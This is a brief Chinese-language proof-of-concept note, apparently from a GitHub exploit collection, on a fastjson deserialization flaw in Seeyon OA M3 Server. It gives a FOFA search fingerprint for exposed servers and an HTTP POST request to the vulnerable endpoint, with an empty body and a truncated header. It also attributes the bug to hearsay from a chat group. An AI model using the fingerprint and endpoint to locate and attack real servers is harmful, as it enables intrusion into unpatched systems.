
## 致远OA M3 Server 反序列化漏洞

## fofa
```
"M3-Server 已启动"
```

根据群友说，这个漏洞是fastjson反序列化
## poc
```
POST /mobile_portal/api/pns/message/send/batch/6_1sp1 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 
Content-Type: application/x-www-form-urlencod


```
![ef21d114d1965815537db98570d2daf7](https://github.com/wy876/POC/assets/139549762/b3609c72-0516-4c69-a64f-62c86fffb30d)

## 漏洞分析
```
https://mp.weixin.qq.com/s/czbhaf7jpNmgjAt-OFWmIA
```
